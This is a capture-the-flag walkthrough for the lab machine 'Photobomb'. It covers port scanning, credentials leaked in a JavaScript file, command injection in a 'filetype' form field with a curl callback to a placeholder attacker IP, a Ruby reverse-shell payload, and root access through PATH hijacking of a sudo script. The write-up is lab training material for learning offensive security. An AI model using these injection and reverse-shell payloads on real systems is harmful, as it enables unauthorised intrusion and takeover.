## Enumeration

```shell
$ sudo nmap -T4 10.10.11.182
[sudo] password for parallels: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-15 09:42 PST
Nmap scan report for 10.10.11.182
Host is up (0.50s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.79 seconds
```

```
$ sudo nmap -T4 10.10.11.182 -p22,80 -A
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-15 09:48 PST
Nmap scan report for 10.10.11.182
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   86.58 ms 10.10.14.1
2   86.68 ms 10.10.11.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds
```

- Add `10.10.11.182 photobomb.htb` to our `/etc/hosts`

- After browsing the `http://photobomb.htb` via ZAP, there are some interesting pages and files.


```html
GET http://photobomb.htb/robots.txt HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

<!DOCTYPE html>
<html>
<head>
  <style type="text/css">
  body { text-align:center;font-family:helvetica,arial;font-size:22px;
    color:#888;margin:20px}
  #c {margin:0 auto;width:500px;text-align:left}
  </style>
</head>
<body>
  <h2>Sinatra doesn’t know this ditty.</h2>
  <img src='http://127.0.0.1:4567/__sinatra__/404.png'>
  <div id="c">
    Try this:
    <pre>get &#x27;&#x2F;.robots.txt&#x27; do
  &quot;Hello World&quot;
end
</pre>
  </div>
</body>
</html>
```

```js
// GET http://photobomb.htb/photobomb.js HTTP/1.1
// Host: photobomb.htb
// User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
// Accept: */*
// Accept-Language: en-US,en;q=0.5
// Connection: keep-alive
// Sec-Fetch-Dest: empty
// Sec-Fetch-Mode: cors
// Sec-Fetch-Site: same-origin

function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

By the `/photobomb.js`, we can access `/printer` page by credential `pH0t0:b0Mb!`. Inside it, there is a POST API.

## Foothold
```
POST http://photobomb.htb/printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: https://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: keep-alive
Referer: https://photobomb.htb/printer
Cookie: isPhotoBombTechSupport=true
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png&dimensions=600x400
```

It seems like it could be vulnerable to command injection.
After trying each parameter, `filetype` seems like a possible blind injection.
Run `python -m http.server` and change the request body as `photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;curl+http://attacker_ip:8000/hash&dimensions=600x400`.

```
POST http://photobomb.htb/printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: https://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: keep-alive
Referer: https://photobomb.htb/printer
Cookie: isPhotoBombTechSupport=true
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;ruby+-rsocket+-e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("attacker_ip",4444))'&dimensions=600x400
```

```
$ python -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.182 - - [15/Dec/2022 10:19:43] "GET /hash HTTP/1.1" 200 -
```

It confirms that the command injection is successful. Thus, we can initialize a reverse shell. 
We know the server use ruby after searching `Sinatra` server on google.

```shell-session
$ pwncat-cs -lp 4444   
[10:24:45] Welcome to pwncat 🐈! 
[10:32:30] received connection from 10.10.11.182:50984 
[10:32:33] 0.0.0.0:4444: upgrading from /usr/bin/dash to /usr/bin/bash
[10:32:34] 10.10.11.182:50984: registered new host w/ db
(local) pwncat$
(remote) wizard@photobomb:/home/wizard/photobomb$ ls
log  photobomb.sh  public  resized_images  server.rb  source_images
```



## Privilege

```
(remote) wizard@photobomb:/home/wizard$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh

(remote) wizard@photobomb:/home/wizard$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

In `sudo -l`, we get a script `/opt/cleanup.sh` with `SETENV` argument. 
After checking [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation), this directive allows the user to set an environment variable while executing something.
Fortunately, in the `/opt/cleanup.sh`, `find` is not referenced from the absolute path. 

```
(remote) wizard@photobomb:/home/wizard$ cd /tmp
(remote) wizard@photobomb:/tmp$ echo bash > find
(remote) wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# cd /root
root@photobomb:~# ls
root.txt
```
